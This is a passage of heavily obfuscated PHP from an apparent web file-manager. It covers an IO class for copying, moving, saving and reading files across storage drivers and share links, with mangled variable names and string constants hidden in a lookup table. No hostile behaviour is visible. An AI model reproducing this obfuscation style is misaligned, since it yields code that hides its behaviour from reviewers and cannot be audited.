$Î…âô¹‚) { } continue; } $ÛÊÎû[$¸˜óÃ¹Ñ] = $ß«ŒÖª´; } if (!$Ÿò×±) { return; } if (!$ÛÊÎû) { return Cache::remove($Èªµ£Å); } Cache::set($Èªµ£Å, $ÛÊÎû, 60); Cache::removeMemory($Èªµ£Å); } public static function finished($õµó²Ä¢, $š£´™À) { $½Ú…¥Øâ =& $_SERVER[ÅÄÇĞô]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($½Ú…¥Øâ[344] => $õµó²Ä¢, $½Ú…¥Øâ[1897] => $š£´™À); } private static function finishedRun() { $„ÌÏŸÌÙ =& $_SERVER[ÅÄÇĞô]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $Í‚ØüÌ«) { try { Hook::apply($Í‚ØüÌ«[$„ÌÏŸÌÙ[344]], $Í‚ØüÌ«[$„ÌÏŸÌÙ[1897]]); } catch (Exception $Íí¤Ğ) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto D•Ö²çÍæí; cõÂåé»©´: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($Ä¡Šóá, $¢Ğæ†˜í) { $×ú©¡Ö‡ =& $_SERVER[ÅÄÇĞô]; $”ÅêÖ ¾ = $¢Ğæ†˜í; $GLOBALS[$×ú©¡Ö‡[1250]] = $×ú©¡Ö‡[1251] . $Ä¡Šóá; Hook::trigger($×ú©¡Ö‡[1251] . $Ä¡Šóá . $×ú©¡Ö‡[1252], $”ÅêÖ ¾); $áèÄñ»î = self::driverMake($¢Ğæ†˜í[0]); if (!$áèÄñ»î) { return !1; } if (method_exists($áèÄñ»î, $Ä¡Šóá)) { $Ø¤¥µØ = @call_user_func_array(array($áèÄñ»î, $Ä¡Šóá), $¢Ğæ†˜í); } else { if (method_exists($áèÄñ»î, $×ú©¡Ö‡[1253])) { $Ø¤¥µØ = @call_user_func_array(array($áèÄñ»î, $Ä¡Šóá), $¢Ğæ†˜í); } else { if (method_exists(self, $Ä¡Šóá)) { $Ø¤¥µØ = @call_user_func_array(array(self, $Ä¡Šóá), $¢Ğæ†˜í); } else { $Ø¤¥µØ = call_user_func_array(array(parent, $Ä¡Šóá), $¢Ğæ†˜í); } } } Hook::trigger($×ú©¡Ö‡[1251] . $Ä¡Šóá . $×ú©¡Ö‡[1254], $”ÅêÖ ¾, $Ø¤¥µØ); return $Ø¤¥µØ; } public static function init($æ¥˜¦„¶) { return self::driverMake($æ¥˜¦„¶); } public static function copy($úşë·Ÿö, $áÚ§°«ˆ, $ĞïÒÊÇ¨ = false, $Ëõ÷ˆ¯å = false) { return self::copyMoveStart($úşë·Ÿö, $áÚ§°«ˆ, $ĞïÒÊÇ¨, $_SERVER[ÅÄÇĞô][626], $Ëõ÷ˆ¯å); } public static function move($»†è› ¼, $•û’¢©Ç, $—üÓù¨ı = false, $Û¹æ›£ = false) { return self::copyMoveStart($»†è› ¼, $•û’¢©Ç, $—üÓù¨ı, $_SERVER[ÅÄÇĞô][628], $Û¹æ›£); } public static function copyMoveChildren($¹¦’Ç×—, $‚˜¤ÅŠ¤, $ãóÚ¢˜µ = "\x63\157\160\171", $ï·Ì³¦ = REPEAT_REPLACE) { $éÚĞÎ‘ş =& $_SERVER[ÅÄÇĞô]; $‰¤®¬ıÔ = $¹¦’Ç×—; $ÖÌÒ×ÀŸ = self::driverMake($¹¦’Ç×—); $¿ğÌâÑ = $ÖÌÒ×ÀŸ->listPath($¹¦’Ç×—, !0); $–»ãèÇ = array_merge($¿ğÌâÑ[$éÚĞÎ‘ş[86]], $¿ğÌâÑ[$éÚĞÎ‘ş[85]]); foreach ($–»ãèÇ as $¶èàÂ²Ì) { self::copyMoveStart($¶èàÂ²Ì[$éÚĞÎ‘ş[87]], $‚˜¤ÅŠ¤, $ï·Ì³¦, $ãóÚ¢˜µ, !1); } if ($ãóÚ¢˜µ == $éÚĞÎ‘ş[628]) { self::remove($‰¤®¬ıÔ); } } private static function copyMoveStart($‘÷ˆ™Â, $øíÅ¶­, $ÌÄ´«É–, $ò“ìˆßË, $²ù×Ü») { $ıäŠĞÅä =& $_SERVER[ÅÄÇĞô]; $ÍÙ“×ä» = array($‘÷ˆ™Â, $øíÅ¶­, $ÌÄ´«É–, $²ù×Ü»); Hook::trigger($ıäŠĞÅä[1251] . $ò“ìˆßË . $ıäŠĞÅä[1252], $ÍÙ“×ä»); $²âİÜ¤¯ = self::copyMove($‘÷ˆ™Â, $øíÅ¶­, $ÌÄ´«É–, $ò“ìˆßË, $²ù×Ü»); Hook::trigger($ıäŠĞÅä[1251] . $ò“ìˆßË . $ıäŠĞÅä[1254], $ÍÙ“×ä», $²âİÜ¤¯); return $²âİÜ¤¯; } public static function saveFile($ºù¼²œ, $²ßÊÍ¡³, $ù¬õÌÎˆ = true) { $—™ñ½ =& $_SERVER[ÅÄÇĞô]; $ÕÀúø€€ = self::info($²ßÊÍ¡³); $ø†à™Ô = self::driverMake($ºù¼²œ); $¸º¢½£¾ = self::driverMake($²ßÊÍ¡³); $¥±ØÓÕÛ = !1; if ($¸º¢½£¾->pathParse[$—™ñ½[1255]]) { $¥±ØÓÕÛ = $¸º¢½£¾; $ş‘²âÚÚ = $¸º¢½£¾->pathParse[$—™ñ½[1255]]; $¸º¢½£¾ = self::driverMake($ş‘²âÚÚ); } if ($ø†à™Ô->pathParse[$—™ñ½[1255]]) { $é‡†Õƒ = $ø†à™Ô->pathParse[$—™ñ½[1255]]; $ø†à™Ô = self::driverMake($é‡†Õƒ); } $Åˆ§ìÇÃ = $¸º¢½£¾->pathFather($²ßÊÍ¡³); $‚Ğ«¦Ö´ = !0; if (!$ù¬õÌÎˆ && self::driverIsSame($ø†à™Ô, $¸º¢½£¾)) { $‚Ğ«¦Ö´ = !1; } $Íì¢à = self::copyFile($ø†à™Ô, $ºù¼²œ, $¸º¢½£¾, $Åˆ§ìÇÃ, $ÕÀúø€€[$—™ñ½[32]], $‚Ğ«¦Ö´); if ($¥±ØÓÕÛ) { $Íì¢à = $¥±ØÓÕÛ->getPathOuter($Íì¢à); } return $Íì¢à; } private static function copyMove($üúö‰ç, $Î°ÏóŒ, $–ãæ»›Ø, $Åã¹õ, $¯œò—šˆ = false) { $ŠğşÍ¾ª =& $_SERVER[ÅÄÇĞô]; if (!$üúö‰ç || $üúö‰ç == $ŠğşÍ¾ª[8] || !$Î°ÏóŒ) { return !1; } ignore_timeout(); $¦ö’ÀıŞ = self::driverMake($üúö‰ç); $Î¬Â³¬² = self::driverMake($Î°ÏóŒ); $Ö“óğ‰³ = $Åã¹õ == $ŠğşÍ¾ª[628]; $”ÀÁí—Á = !1; if ($Î¬Â³¬²->pathParse[$ŠğşÍ¾ª[1255]]) { $”ÀÁí—Á = $Î¬Â³¬²; $Î°ÏóŒ = $Î¬Â³¬²->pathParse[$ŠğşÍ¾ª[1255]]; $Î¬Â³¬² = self::driverMake($Î°ÏóŒ); } if ($¦ö’ÀıŞ->pathParse[$ŠğşÍ¾ª[1255]]) { $üúö‰ç = $¦ö’ÀıŞ->pathParse[$ŠğşÍ¾ª[1255]]; $¦ö’ÀıŞ = self::driverMake($üúö‰ç); } self::check($¦ö’ÀıŞ, $üúö‰ç, $Î¬Â³¬², $Î°ÏóŒ); Hook::trigger($ŠğşÍ¾ª[1256], $¦ö’ÀıŞ, $üúö‰ç, $Î¬Â³¬², $Î°ÏóŒ); $…Âãç–æ = self::driverIsSame($¦ö’ÀıŞ, $Î¬Â³¬²); if ($…Âãç–æ) { if ($Åã¹õ == $ŠğşÍ¾ª[628] && !method_exists($Î¬Â³¬², $ŠğşÍ¾ª[1257]) && trim($Î°ÏóŒ, $ŠğşÍ¾ª[8]) == trim($Î¬Â³¬²->pathFather($üúö‰ç), $ŠğşÍ¾ª[8])) { if ($¦ö’ÀıŞ->pathThis($üúö‰ç) != $¯œò—šˆ && !$¦ö’ÀıŞ->isOsDriver()) { return $¦ö’ÀıŞ->rename($üúö‰ç, $¯œò—šˆ); } return $Î¬Â³¬²->getPathOuter($üúö‰ç); } if (method_exists($Î¬Â³¬², $Åã¹õ)) { return $Î¬Â³¬²->{$Åã¹õ}($üúö‰ç, $Î°ÏóŒ, $–ãæ»›Ø, $¯œò—šˆ); } } if ($…Âãç–æ && $Åã¹õ == $ŠğşÍ¾ª[628] && $Î¬Â³¬²->getType() == $ŠğşÍ¾ª[109]) { $ˆÈòĞĞš = $Î¬Â³¬²->movePath($üúö‰ç, $Î°ÏóŒ, $¯œò—šˆ); if ($ˆÈòĞĞš) { return $ˆÈòĞĞš; } } $Çæ òú = $¦ö’ÀıŞ->isFile($üúö‰ç); if (!$Çæ òú && $Î¬Â³¬²->getType() == $ŠğşÍ¾ª[852] && $¦ö’ÀıŞ->getType() == $ŠğşÍ¾ª[109]) { $ˆÈòĞĞš = $Î¬Â³¬²->copyFolderFromIO($¦ö’ÀıŞ, $üúö‰ç, $Î°ÏóŒ, $–ãæ»›Ø, $Ö“óğ‰³, $¯œò—šˆ); } else { $ˆÈòĞĞš = self::copyPath($¦ö’ÀıŞ, $üúö‰ç, $Î¬Â³¬², $Î°ÏóŒ, $–ãæ»›Ø, $Ö“óğ‰³, $Çæ òú, $¯œò—šˆ); } if ($ˆÈòĞĞš && $Ö“óğ‰³) { $¦ö’ÀıŞ->remove($üúö‰ç); } if ($”ÀÁí—Á) { $ˆÈòĞĞš = $”ÀÁí—Á->getPathOuter($ˆÈòĞĞš); } return $ˆÈòĞĞš; } private static function check($Äï™ÊØ, $Í„åà¡ß, $í´„…¶î, &$ÂÀŞ×â) { $…‚ÉÅâø =& $_SERVER[ÅÄÇĞô]; if (self::driverIsSame($Äï™ÊØ, $í´„…¶î) && $Äï™ÊØ->isFolder($Í„åà¡ß) && $Äï™ÊØ->isParentOf($Í„åà¡ß, $ÂÀŞ×â)) { show_json(LNG($…‚ÉÅâø[1258]), !1); } if (!$Äï™ÊØ->exist($Í„åà¡ß)) { show_json(LNG($…‚ÉÅâø[108]), !1); } } private static function copyPath($şõÏ¨°, $ÈÊ…ËÖ, $šÀÀ‹¹©, $½º£‘õ“, $ÅËööÚ‡, $­¥£Æƒó, $ˆ›ı§Òä, $ì€éë€Ø = false, $éÈÄãµˆ = true) { $óéÍà‚ =& $_SERVER[ÅÄÇĞô]; $ØÍıœ = empty($ì€éë€Ø) && $ì€éë€Ø !== $óéÍà‚[231] ? $şõÏ¨°->pathThis($ÈÊ…ËÖ) : $ì€éë€Ø; if ($ÅËööÚ‡) { $ÍóŞ²ÌÒ = $šÀÀ‹¹©->fileNameExist($½º£‘õ“, $ØÍıœ); $ÙÒÆÓ¨­ = $ØÍıœ; $ØÍıœ = $šÀÀ‹¹©->fileNameAuto($½º£‘õ“, $ØÍıœ, $ÅËööÚ‡, !$ˆ›ı§Òä); if (!$ÍóŞ²ÌÒ || $ÙÒÆÓ¨­ != $ØÍıœ) { $ÅËööÚ‡ = !1; } if ($éÈÄãµˆ && !$ÅËööÚ‡) { $šÀÀ‹¹©->_data[$óéÍà‚[1259]] = !0; } } if ($ˆ›ı§Òä) { return self::copyFile($şõÏ¨°, $ÈÊ…ËÖ, $šÀÀ‹¹©, $½º£‘õ“, $ØÍıœ, $­¥£Æƒó); } if ($ÅËööÚ‡ == REPEAT_RENAME_FOLDER) { $ÅËööÚ‡ = !1; } $îÖ«¾ı = rtrim($½º£‘õ“, $óéÍà‚[8]) . $óéÍà‚[8] . $ØÍıœ; $ï¡Êèˆ» = $šÀÀ‹¹©->mkdir($šÀÀ‹¹©->getPath($îÖ«¾ı), $ÅËööÚ‡); $½º£‘õ“ = $šÀÀ‹¹©->getPathInner($ï¡Êèˆ»); $¹Ú‘ÒãÅ = $şõÏ¨°->listPath($ÈÊ…ËÖ, !0); $¹Ú‘ÒãÅ = is_array($¹Ú‘ÒãÅ) ? $¹Ú‘ÒãÅ : array($óéÍà‚[86] => array(), $óéÍà‚[85] => array()); $æ¶§•©ˆ = array_merge($¹Ú‘ÒãÅ[$óéÍà‚[86]], $¹Ú‘ÒãÅ[$óéÍà‚[85]]); foreach ($æ¶§•©ˆ as $ªõÛµÂù) { $©¥†È™¤ = $ªõÛµÂù[$óéÍà‚[33]] == $óéÍà‚[233]; $ÈÊ…ËÖ = $şõÏ¨°->getPathInner($ªõÛµÂù[$óéÍà‚[87]]); $³ªææ¸• = self::copyPath($şõÏ¨°, $ÈÊ…ËÖ, $šÀÀ‹¹©, $½º£‘õ“, $ÅËööÚ‡, $­¥£Æƒó, $©¥†È™¤, !1, !1); if (!$³ªææ¸•) { IO::errorTips($óéÍà‚[1260] . $ÈÊ…ËÖ . $óéÍà‚[73] . $½º£‘õ“); } } self::copyMoveKeepInfo($şõÏ¨°, $ÈÊ…ËÖ, $ï¡Êèˆ»); return $ï¡Êèˆ»; } private static function copyFile($è¼æãï, $µÍºÁ±³, $Ü±Ç·¢¬, $ù¢Ø¼ç‰, $´½®Ì–², $¾¸Íàï) { $½½“ğ·¥ =& $_SERVER[ÅÄÇĞô]; $ù¢Ø¼ç‰ = $Ü±Ç·¢¬->getPath(rtrim($ù¢Ø¼ç‰, $½½“ğ·¥[8]) . $½½“ğ·¥[8] . $´½®Ì–²); $òƒÉ‚áÄ = $½½“ğ·¥[1261] . time() . rand_string(5); Hook::trigger($½½“ğ·¥[1262], $è¼æãï, $µÍºÁ±³, $Ü±Ç·¢¬, $ù¢Ø¼ç‰, $´½®Ì–², $òƒÉ‚áÄ); if (self::driverIsSame($è¼æãï, $Ü±Ç·¢¬)) { if ($¾¸Íàï) { $éÁûëø¤ = $Ü±Ç·¢¬->moveFile($µÍºÁ±³, $ù¢Ø¼ç‰); } else { $éÁûëø¤ = $Ü±Ç·¢¬->copyFile($µÍºÁ±³, $ù¢Ø¼ç‰); } Hook::trigger($½½“ğ·¥[1263], $è¼æãï, $µÍºÁ±³, $Ü±Ç·¢¬, $ù¢Ø¼ç‰, $´½®Ì–², $éÁûëø¤); self::copyMoveKeepInfo($è¼æãï, $µÍºÁ±³, $éÁûëø¤); return $éÁûëø¤; } $·•Ê¥‰ = TEMP_FILES; if ($GLOBALS[$½½“ğ·¥[6]][$½½“ğ·¥[92]][$½½“ğ·¥[893]]) { $·•Ê¥‰ = $GLOBALS[$½½“ğ·¥[6]][$½½“ğ·¥[92]][$½½“ğ·¥[893]]; } $ç¾£óà‚ = $·•Ê¥‰; mk_dir($ç¾£óà‚); $ıĞºúñ‘ = $ç¾£óà‚ . $òƒÉ‚áÄ; $æ©™ôı = $ıĞºúñ‘; $ıĞºúñ‘ = $è¼æãï->download($µÍºÁ±³, $ıĞºúñ‘); $ıĞºúñ‘ = $è¼æãï->iconvApp($ıĞºúñ‘); if (substr($ıĞºúñ‘, strlen($·•Ê¥‰)) == $·•Ê¥‰) { $¾¸Íàï = !0; } $éÁûëø¤ = $Ü±Ç·¢¬->upload($ù¢Ø¼ç‰, $ıĞºúñ‘, $¾¸Íàï); self::remove($æ©™ôı); Hook::trigger($½½“ğ·¥[1263], $è¼æãï, $µÍºÁ±³, $Ü±Ç·¢¬, $ù¢Ø¼ç‰, $´½®Ì–², $éÁûëø¤); self::copyMoveKeepInfo($è¼æãï, $µÍºÁ±³, $éÁûëø¤); return $éÁûëø¤; } private static function copyMoveKeepInfo($âó´Ì¶», $®ˆ­Âú, $×ìÆå³) { if (!$×ìÆå³) { return; } $ ÉĞØğ½ = $âó´Ì¶»->info($®ˆ­Âú); if (!is_array($ ÉĞØğ½)) { return; } IO::setModifyTime($×ìÆå³, $ ÉĞØğ½[$_SERVER[ÅÄÇĞô][88]]); } public static function pathFather($Öü†Ï£ˆ) { $ÁÇ½Æ…ˆ = IO::init($Öü†Ï£ˆ); $œ—üœ½Ø = $ÁÇ½Æ…ˆ->pathFather($ÁÇ½Æ…ˆ->path); return $ÁÇ½Æ…ˆ->getPathOuter($œ—üœ½Ø); } public static function fileOut($×’‡ôş, $§î÷ı€™ = false, $Ï¯ˆùÒ‹ = false, $å­£™ğŒ = '') { $É”Áàú¸ = self::driverMake($×’‡ôş); if ($É”Áàú¸->isFileOutServer()) { return $É”Áàú¸->fileOutServer($×’‡ôş, $§î÷ı€™, $Ï¯ˆùÒ‹, $å­£™ğŒ); } return $É”Áàú¸->fileOut($×’‡ôş, $§î÷ı€™, $Ï¯ˆùÒ‹, $å­£™ğŒ); } public static function fileOutImage($°½¯–ƒ…, $‹¾•Ìó† = 250) { $ŞıİîÁç = array(250, 600, 1200, 2000, 3000, 5000); for ($î°¤Ç¹ = 0; $î°¤Ç¹ < count($ŞıİîÁç); $î°¤Ç¹++) { if ($î°¤Ç¹ == 0 && $‹¾•Ìó† <= $ŞıİîÁç[$î°¤Ç¹]) { $‹¾•Ìó† = $ŞıİîÁç[$î°¤Ç¹]; break; } else { if ($‹¾•Ìó† > $ŞıİîÁç[$î°¤Ç¹ - 1] && $‹¾•Ìó† <= $ŞıİîÁç[$î°¤Ç¹]) { $‹¾•Ìó† = $ŞıİîÁç[$î°¤Ç¹]; break; } else { if ($î°¤Ç¹ == count($ŞıİîÁç) - 1 && $‹¾•Ìó† > $ŞıİîÁç[$î°¤Ç¹]) { $‹¾•Ìó† = $ŞıİîÁç[$î°¤Ç¹]; break; } } } } $á—šîœ = self::driverMake($°½¯–ƒ…); if ($á—šîœ->isFileOutServer()) { return $á—šîœ->fileOutImageServer($°½¯–ƒ…, $‹¾•Ìó†); } return $á—šîœ->fileOutImage($°½¯–ƒ…, $‹¾•Ìó†); } private static function driverIsSame($ÕˆşÍ­Ç, $Ğ¨¥Ûùâ) { $ß£³ÔÂ =& $_SERVER[ÅÄÇĞô]; $ÁµñØ¸ = $ÕˆşÍ­Ç->getType(); $İäÖ‘òË = $Ğ¨¥Ûùâ->getType(); if ($ÁµñØ¸ != $İäÖ‘òË) { return !1; } if ($ÁµñØ¸ == $ß£³ÔÂ[852]) { return !0; } if ($ÁµñØ¸ == $ß£³ÔÂ[109]) { return !0; } if ($ÕˆşÍ­Ç->pathDriver == $Ğ¨¥Ûùâ->pathDriver) { return !0; } return !1; } public static function copyUpdate($¸…¥«’Ç, $“ßÖñ¶ô) { $¥”˜·– =& $_SERVER[ÅÄÇĞô]; if (!IO::exist($¸…¥«’Ç)) { return !1; } if (!IO::exist($“ßÖñ¶ô)) { IO::mkdir($“ßÖñ¶ô); } $ÍüÓ¥ñŠ = array_to_keyvalue(self::listAllSimple($¸…¥«’Ç), $¥”˜·–[87]); $¡‚Í†­Ã = array_to_keyvalue(self::listAllSimple($“ßÖñ¶ô), $¥”˜·–[87]); $ƒ¬—Áî = array(); $Æš”÷¥ = array(); foreach ($ÍüÓ¥ñŠ as $ÈşêŸÂÒ => $Ã”šœÃœ) { if (isset($¡‚Í†­Ã[$ÈşêŸÂÒ])) { if ($Ã”šœÃœ[$¥”˜·–[78]] == 1) { continue; } if ($¡‚Í†­Ã[$ÈşêŸÂÒ][$¥”˜·–[79]] == $Ã”šœÃœ[$¥”˜·–[79]]) { continue; } } if ($Ã”šœÃœ[$¥”˜·–[78]] == 1) { $Æš”÷¥[] = $“ßÖñ¶ô . $¥”˜·–[8] . trim($ÈşêŸÂÒ, $¥”˜·–[8]); continue; } $´¿ûıÂ = strstr(trim($ÈşêŸÂÒ, $¥”˜·–[8]), $¥”˜·–[8]) ? get_path_father($ÈşêŸÂÒ) : $¥”˜·–[12]; $ƒ¬—Áî[] = array($¥”˜·–[1264] => $Ã”šœÃœ[$¥”˜·–[89]], $¥”˜·–[1265] => rtrim($“ßÖñ¶ô, $¥”˜·–[8]) . $¥”˜·–[8] . $´¿ûıÂ, $¥”˜·–[1266] => $Ã”šœÃœ); } $˜¿ºÀş = array($¥”˜·–[233] => $ƒ¬—Áî, $¥”˜·–[78] => $Æš”÷¥); Hook::trigger($¥”˜·–[1267], $¸…¥«’Ç, $“ßÖñ¶ô, $˜¿ºÀş); foreach ($Æš”÷¥ as $Ã”šœÃœ) { IO::mkdir($Ã”šœÃœ); } foreach ($ƒ¬—Áî as $Ã”šœÃœ) { IO::copy($Ã”šœÃœ[$¥”˜·–[1264]], $Ã”šœÃœ[$¥”˜·–[1265]], REPEAT_REPLACE); } } public static function fileSubstr($ †äÍå·, $“ªÂÊ¿, $Ó«†è‘× = false) { $­ÕÏ¬å‘ =& $_SERVER[ÅÄÇĞô]; $”Ü†È¬é = self::driverMake($ †äÍå·); $ÄÜ’ââ = $”Ü†È¬é->size($ †äÍå·); $ÌÎî»İ = $“ªÂÊ¿; $´ÄüŞ¨Ñ = $Ó«†è‘×; if ($“ªÂÊ¿ < 0) { $“ªÂÊ¿ = $ÄÜ’ââ + $“ªÂÊ¿; } if ($Ó«†è‘× === !1) { $Ó«†è‘× = $ÄÜ’ââ - $“ªÂÊ¿; } if ($“ªÂÊ¿ + $Ó«†è‘× > $ÄÜ’ââ) { $Ó«†è‘× = $ÄÜ’ââ - $“ªÂÊ¿; } if (!$ÄÜ’ââ && $”Ü†È¬é->getType() == $­ÕÏ¬å‘[109] && !$”Ü†È¬é->exist($ †äÍå·)) { $ËšÍñ™Ê = get_path_this($ †äÍå·); $ñÖòŸÚ„ = parse_url_query($ËšÍñ™Ê); if (is_array($ñÖòŸÚ„) && isset($ñÖòŸÚ„[$­ÕÏ¬å‘[32]])) { $ËšÍñ™Ê = urldecode($ñÖòŸÚ„[$­ÕÏ¬å‘[32]]); } throw new Exception($­ÕÏ¬å‘[1268] . LNG($­ÕÏ¬å‘[1269]) . $­ÕÏ¬å‘[1066] . clear_html($ËšÍñ™Ê) . $­ÕÏ¬å‘[12]); } if ($Ó«†è‘× <= 0) { return $­ÕÏ¬å‘[12]; } if ($“ªÂÊ¿ < 0 || $“ªÂÊ¿ >= $ÄÜ’ââ || $Ó«†è‘× > 1024 * 1024 * 10) { throw new Exception("\x66\151\154\145\122\145\141\x64\40\x65\162\162\x6f\x72\41\40\163\x74\141\x72\164\x3d{$“ªÂÊ¿}\x3b\x6c\x65\156\147\x74\150\75{$Ó«†è‘×}\73\x20\x73\x69\172\145\x3d{$ÄÜ’ââ}\73"); } $¢õÉè– = $”Ü†È¬é->fileSubstr($ †äÍå·, $“ªÂÊ¿, $Ó«†è‘×); if (!$¢õÉè– && $Ó«†è‘× && isset($GLOBALS[$­ÕÏ¬å‘[1270]])) { throw new Exception($GLOBALS[$­ÕÏ¬å‘[1270]][$­ÕÏ¬å‘[1271]]); } return $¢õÉè–; } private static function driverMake(&$¢İÊä‹É) { $·ÕÍ¦è— =& $_SERVER[ÅÄÇĞô]; $É½­ùÔÍ = KodIO::parse($¢İÊä‹É); if (!self::$driverListSystem) { $·ªîÄñ´ = Model($·ÕÍ¦è—[862])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($·ªîÄñ´, $·ÕÍ¦è—[478]); } if ($É½­ùÔÍ[$·ÕÍ¦è—[33]] == KodIO::KOD_IO && !self::$driverListSystem[$É½­ùÔÍ[$·ÕÍ¦è—[478]]]) { throw new Exception($·ÕÍ¦è—[1272]); return !1; } $¢İÊä‹É = $É½­ùÔÍ[$·ÕÍ¦è—[1273]]; $ª’–Ûİ = self::driverGet($É½­ùÔÍ, $¢İÊä‹É); return $ª’–Ûİ; } private static function driverGet($ˆæŠíŞ, &$¯ğ•Ê”) { $…¾÷Ğë =& $_SERVER[ÅÄÇĞô]; $¡•Èª»³ = $ˆæŠíŞ[$…¾÷Ğë[1274]]; $Ï•¨êØ¨ = $ˆæŠíŞ[$…¾÷Ğë[478]]; switch ($ˆæŠíŞ[$…¾÷Ğë[33]]) { case KodIO::KOD_IO: $úö«µÒ× = self::$driverListSystem[$Ï•¨êØ¨]; break; case KodIO::KOD_SOURCE: $¯ğ•Ê” = $Ï•¨êØ¨ . $¯ğ•Ê”; $úö«µÒ× = array($…¾÷Ğë[1275] => $…¾÷Ğë[1276], $…¾÷Ğë[6] => $ˆæŠíŞ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $ƒö˜èÛÖ = $GLOBALS[$…¾÷Ğë[1277]]; self::$driverListUser = array_to_keyvalue($ƒö˜èÛÖ, $…¾÷Ğë[478]); } $úö«µÒ× = self::$driverListUser[$Ï•¨êØ¨]; break; case KodIO::KOD_SHARE_LINK: $úö«µÒ× = array($…¾÷Ğë[1275] => $…¾÷Ğë[1278], $…¾÷Ğë[6] => $ˆæŠíŞ); $¤“ßÆÙÌ = Action($…¾÷Ğë[1279])->sharePathInfo($ˆæŠíŞ[$…¾÷Ğë[87]]); $¯ğ•Ê” = $¤“ßÆÙÌ[$…¾÷Ğë[194]]; if (!$¤“ßÆÙÌ[$…¾÷Ğë[194]]) { $ˆÇêÊ“× = Model($…¾÷Ğë[672])->getInfo($¤“ßÆÙÌ[$…¾÷Ğë[673]]); $¯ğ•Ê” = KodIO::clear($ˆÇêÊ“×[$…¾÷Ğë[1280]] . $ˆæŠíŞ[$…¾÷Ğë[1273]]); $ˆæŠíŞ[$…¾÷Ğë[565]] = $ˆÇêÊ“×; $ˆæŠíŞ[$…¾÷Ğë[1255]] = $¯ğ•Ê”; $úö«µÒ× = array($…¾÷Ğë[1275] => $…¾÷Ğë[1281], $…¾÷Ğë[6] => $ˆæŠíŞ); } break; case KodIO::KOD_SHARE_ITEM: $úö«µÒ× = array($…¾÷Ğë[1275] => $…¾÷Ğë[1282], $…¾÷Ğë[6] => $ˆæŠíŞ); $ˆÇêÊ“× = Model($…¾÷Ğë[672])->getInfo($ˆæŠíŞ[$…¾÷Ğë[478]]); if ($ˆÇêÊ“×[$…¾÷Ğë[194]] == $…¾÷Ğë[231]) { $¯ğ•Ê” = KodIO::clear($ˆÇêÊ“×[$…¾÷Ğë[1280]] . $ˆæŠíŞ[$…¾÷Ğë[1273]]); $ˆæŠíŞ[$…¾÷Ğë[565]] = $ˆÇêÊ“×; $ˆæŠíŞ[$…¾÷Ğë[1255]] = $¯ğ•Ê”; $úö«µÒ× = array($…¾÷Ğë[1275] => $…¾÷Ğë[1283], $…¾÷Ğë[6] => $ˆæŠíŞ); } else { if (!$¯ğ•Ê”) { $¯ğ•Ê” = $ˆÇêÊ“×[$…¾÷Ğë[194]]; } } break; default: $¯ğ•Ê” = $ˆæŠíŞ[$…¾÷Ğë[87]]; $úö«µÒ× = array($…¾÷Ğë[1275] => $…¾÷Ğë[1284]); break; } $¾½ÁÕå» = $ˆæŠíŞ[$…¾÷Ğë[87]]; if (!isset(self::$driverCache[$¾½ÁÕå»])) { $ìé”‡ÈÔ = strtolower($úö«µÒ×[$…¾÷Ğë[98]]); $³´—¡ûº = $GLOBALS[$…¾÷Ğë[6]][$…¾÷Ğë[92]][$…¾÷Ğë[926]]; $¦­˜ßË± = $…¾÷Ğë[77] . (isset($³´—¡ûº[$ìé”‡ÈÔ]) ? $³´—¡ûº[$ìé”‡ÈÔ] : ucfirst($ìé”‡ÈÔ)); if (!class_exists($¦­˜ßË±)) { show_json("{$¦­˜ßË±}\40\156\157\x74\x20\145\x78\x69\x73\164\x73\x21", !1); } $Âì´†Î = isset($úö«µÒ×[$…¾÷Ğë[6]]) ? $úö«µÒ×[$…¾÷Ğë[6]] : !1; self::$driverCache[$¾½ÁÕå»] = new $¦­˜ßË±($Âì´†Î); } $œï“ = self::$driverCache[$¾½ÁÕå»]; $œï“->pathDriver = $¡•Èª»³; $œï“->pathBase = $…¾÷Ğë[12]; if (isset($úö«µÒ×[$…¾÷Ğë[6]][$…¾÷Ğë[1285]])) { $œï“->pathBase = rtrim($úö«µÒ×[$…¾÷Ğë[6]][$…¾÷Ğë[1285]], $…¾÷Ğë[8]) . $…¾÷Ğë[8]; $¯ğ•Ê” = $œï“->pathBase . ltrim($¯ğ•Ê”, $…¾÷Ğë[8]); } $¯ğ•Ê” = $œï“->getPath($¯ğ•Ê”); if (isset($ˆæŠíŞ[$…¾÷Ğë[1255]])) { $¯ğ•Ê” = $ˆæŠíŞ[$…¾÷Ğë[1255]]; } $œï“->path = $¯ğ•Ê”; return $œï“; } public static function errorTips($µğıÃ¤‰ = false) { $£´Êú¬š =& $_SERVER[ÅÄÇĞô]; static $»ÆÈÄ‚ = array(); $ÂÏ¾˜àƒ = 1000; if ($µğıÃ¤‰ === -1) { return $»ÆÈÄ‚ ? $»ÆÈÄ‚[count($»ÆÈÄ‚) - 1] : $£´Êú¬š[12]; } if ($µğıÃ¤‰ === !1) { return implode($£´Êú¬š[288], $»ÆÈÄ‚); } if (count($»ÆÈÄ‚) >= $ÂÏ¾˜àƒ) { $»ÆÈÄ‚ = array_slice($»ÆÈÄ‚, $ÂÏ¾˜àƒ * 0.5, $ÂÏ¾˜àƒ); } $»ÆÈÄ‚[] = $µğıÃ¤‰; write_log($£´Êú¬š[176] . ACTION . $£´Êú¬š[1286] . $µğıÃ¤‰, $£´Êú¬š[1287]); } public static function getLastError($’Ùä…Óí = '') { $Ò™€í¥ = self::errorTips(-1); return $Ò™€í¥ ? $Ò™€í¥ : $’Ùä…Óí; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $ö†Í»‹“; if ($ö†Í»‹“) { return $ö†Í»‹“; } $ÁÔ½Ş²½ = IO::init($_SERVER[ÅÄÇĞô][8]); return $ÁÔ½Ş²½; } private static function iconvSystem($ÜŞÍ›Èü) { return self::local()->iconvSystem($ÜŞÍ›Èü); } private static function iconvApp($ßÁŞ¨÷—) { return self::local()->iconvApp($ßÁŞ¨÷—); } public static function zipFolder($á–ì½ÚÌ, $âìıÇÕı = "\172\151\x70", $°©®½„¿ = '', $ÁîÌ¹±¾ = REPEAT_RENAME) { $„ÌÍ©Ùâ =& $_SERVER[ÅÄÇĞô]; $˜í€¶Ëø = IO::listPath($á–ì½ÚÌ); if 